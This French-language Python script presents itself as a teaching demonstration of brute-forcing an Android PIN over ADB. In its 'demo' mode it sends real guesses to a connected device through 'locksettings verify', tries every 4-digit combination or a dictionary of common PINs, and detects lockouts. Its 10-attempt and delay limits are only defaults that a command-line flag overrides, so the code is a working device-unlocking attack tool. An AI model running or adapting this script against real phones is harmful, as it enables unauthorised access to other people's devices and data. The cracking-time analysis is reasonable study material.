#!/usr/bin/env python3
"""
demo_bruteforce_limite.py - Démonstration pédagogique d'attaque par force brute
sur code PIN Android via ADB.

Ce script illustre le concept de force brute avec des limites de sécurité :
- Maximum 10 tentatives en mode demo
- Délai configurable entre chaque essai
- Détection de verrouillage de l'appareil
- Pas de stockage ni transmission des données

Usage:
    python3 demo_bruteforce_limite.py --pin 1234 --mode demo
    python3 demo_bruteforce_limite.py --dictionnaire ../dictionnaires/pins_courants.txt --mode simulate
"""

import subprocess
import sys
import time
import argparse
import os

# Configuration ADB
ADB_HOST = "localhost"
ADB_PORT = 5555

def adb_command(cmd):
    full_cmd = f"adb -s {ADB_HOST}:{ADB_PORT} shell {cmd}"
    result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip(), result.returncode

def verifier_connexion_adb():
    result = subprocess.run(
        f"adb -s {ADB_HOST}:{ADB_PORT} get-state",
        shell=True, capture_output=True, text=True
    )
    return result.returncode == 0

def tester_pin(pin):
    """
    Teste un code PIN via locksettings verify.
    Retourne (True, message) si réussi, (False, message) si échoué.
    """
    stdout, _ = adb_command(f"locksettings verify --old {pin}")
    if "verified successfully" in stdout.lower():
        return True, f"PIN {pin} trouvé !"
    elif "didn't match" in stdout.lower():
        return False, f"PIN {pin} incorrect"
    elif any(word in stdout.lower() for word in ["locked", "timeout", "try again", "wait"]):
        return False, f"VERROUILLÉ: {stdout}"
    else:
        return False, f"Erreur: {stdout[:100]}"

def generer_combinaisons(longueur):
    """Génère toutes les combinaisons pour un PIN de longueur donnée."""
    for i in range(10 ** longueur):
        yield str(i).zfill(longueur)

def force_brute_pin(pin_cible, longueur=4, max_essais=None, delai=0.5, mode="demo"):
    """
    Attaque par force brute simulée.

    Paramètres:
        pin_cible: Le PIN à trouver (pour simulation)
        longueur: Nombre de chiffres du PIN
        max_essais: Nombre maximum de tentatives (None = illimité)
        delai: Délai entre chaque tentative en secondes
        mode: "demo" ou "simulate"

    Retourne:
        dict contenant le résultat et les métriques
    """
    essais = 0
    debut = time.time()
    trouve = False
    pin_trouve = None
    verrouille = False

    for combinaison in generer_combinaisons(longueur):
        if max_essais is not None and essais >= max_essais:
            break

        essais += 1

        if mode == "demo":
            # Mode demo : utilise ADB réel
            ok, msg = tester_pin(combinaison)

            if "VERROUILLÉ" in msg:
                print(f"  [!] {msg}")
                verrouille = True
                break

            if ok:
                trouve = True
                pin_trouve = combinaison
                print(f"  [SUCCÈS] {msg}")
                break

            if essais % 5 == 0 or essais == 1:
                print(f"  [{essais}] {msg}")
        else:
            # Mode simulation : pas d'accès ADB
            if combinaison == pin_cible:
                trouve = True
                pin_trouve = combinaison
                print(f"  [SIMULATION] PIN trouvé à l'essai {essais}: {combinaison}")
                break
            if essais % 1000 == 0:
                print(f"  [SIMULATION] Essai {essais}...")

        time.sleep(delai)

    fin = time.time()
    duree = fin - debut

    return {
        "trouve": trouve,
        "pin": pin_trouve,
        "essais": essais,
        "duree_secondes": duree,
        "verrouille": verrouille,
    }

def analyser_risque(longueur, delai=1.0):
    """Analyse le temps nécessaire pour brute-forcer un PIN."""
    combinaisons = 10 ** longueur
    temps_secondes = combinaisons * delai

    unites = [
        (86400, "jours"),
        (3600, "heures"),
        (60, "minutes"),
    ]
    temps_restant = temps_secondes
    for duree, nom in unites:
        if temps_restant >= duree:
            valeur = int(temps_restant // duree)
            temps_restant = temps_restant % duree
            print(f"  {valeur} {nom}", end=" ")
        else:
            break

    print(f"({combinaisons} combinaisons, {delai}s/essai)")
    return combinaisons, temps_secondes

def main():
    parser = argparse.ArgumentParser(
        description="Démonstration d'attaque par force brute sur PIN Android"
    )
    parser.add_argument("--pin", default="1234", help="PIN à tester (mode demo)")
    parser.add_argument("--longueur", type=int, default=4, help="Longueur du PIN")
    parser.add_argument("--mode", choices=["demo", "simulate"], default="simulate",
                        help="Mode d'exécution")
    parser.add_argument("--max-essais", type=int, default=10, help="Nombre max d'essais")
    parser.add_argument("--delai", type=float, default=1.0, help="Délai entre essais (secondes)")
    parser.add_argument("--dictionnaire", help="Chemin vers un fichier dictionnaire")
    parser.add_argument("--analyse", action="store_true", help="Mode analyse des risques")

    args = parser.parse_args()

    print("=" * 60)
    print("  ATTAQUE PAR FORCE BRUTE - CODE PIN ANDROID")
    print("  [CADRE PÉDAGOGIQUE UNIQUEMENT]")
    print("=" * 60)

    if args.analyse:
        print("\n[+] Analyse des risques par longueur de PIN:\n")
        for l in [4, 5, 6, 8]:
            print(f"  PIN {l} chiffres: ", end="")
            analyser_risque(l, args.delai)
        return

    if args.mode == "demo" and not verifier_connexion_adb():
        print("\n[!] Appareil ADB non trouvé. Passage en mode simulation.\n")
        args.mode = "simulate"

    print(f"\n[+] Configuration:")
    print(f"  Mode: {args.mode}")
    print(f"  PIN cible: {'****' if args.mode == 'demo' else args.pin}")
    print(f"  Longueur: {args.longueur}")
    print(f"  Max essais: {args.max_essais}")
    print(f"  Délai: {args.delai}s")

    if args.dictionnaire:
        print(f"  Dictionnaire: {args.dictionnaire}")
        with open(args.dictionnaire) as f:
            pins = [l.strip() for l in f if l.strip()]
        print(f"  Entrées: {len(pins)}")

    print(f"\n[+] Début de l'attaque...\n")

    if args.dictionnaire:
        with open(args.dictionnaire) as f:
            pins = [l.strip() for l in f if l.strip()]

        essais = 0
        trouve = False
        for pin in pins[:args.max_essais]:
            essais += 1
            if args.mode == "demo":
                ok, msg = tester_pin(pin)
                if "VERROUILLÉ" in msg:
                    print(f"  [!] {msg}")
                    break
                if ok:
                    trouve = True
                    print(f"  [SUCCÈS] {msg}")
                    break
                print(f"  [{essais}/{len(pins)}] {msg}")
            else:
                if pin == args.pin:
                    trouve = True
                    print(f"  [SUCCÈS] PIN trouvé à l'essai {essais}: {pin}")
                    break
                if essais % 5 == 0:
                    print(f"  [SIMULATION] Essai {essais}/{len(pins)}: {pin}")
            time.sleep(args.delai)
    else:
        resultat = force_brute_pin(
            pin_cible=args.pin,
            longueur=args.longueur,
            max_essais=args.max_essais,
            delai=args.delai,
            mode=args.mode,
        )

        if resultat["verrouille"]:
            print(f"\n[!] Appareil verrouillé après {resultat['essais']} tentatives.")
        elif resultat["trouve"]:
            print(f"\n[SUCCÈS] PIN trouvé: {resultat['pin']}")
            print(f"  Essais: {resultat['essais']}")
            print(f"  Temps: {resultat['duree_secondes']:.1f}s")
        else:
            print(f"\n[FIN] Attaque arrêtée après {resultat['essais']} essais.")

    print("\n" + "=" * 60)
    print("  FIN DE LA DÉMONSTRATION")
    print("=" * 60)

if __name__ == "__main__":
    main()
